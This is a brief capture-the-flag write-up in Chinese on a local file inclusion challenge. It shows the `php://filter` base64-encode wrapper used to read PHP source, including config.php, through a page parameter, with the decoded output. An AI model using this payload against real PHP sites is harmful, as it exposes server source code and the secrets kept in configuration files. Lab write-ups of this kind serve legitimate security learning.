# LFI
題目提示 `php://filter`  
查看原始碼發現有一個 `?page=pages/flag`  
但直接把檔案印在網頁上只會看到 body 的內容，那麼我們可以把檔案轉成 base64 後查看，使用 `php://filter/read=convert.base64-encode/resource=`
> Q2FuIHlvdSByZWFkIHRoZSBmbGFnPD9waHAgcmVxdWlyZSgnY29uZmlnLnBocCcpOyA/Pj8K

能夠看到一串 base64，拿去 decode 後得到原始碼
> Can you read the flag`<?php require('config.php'); ?>?`

最後對 `config.php` 做相同的事，就能夠拿到 Flag
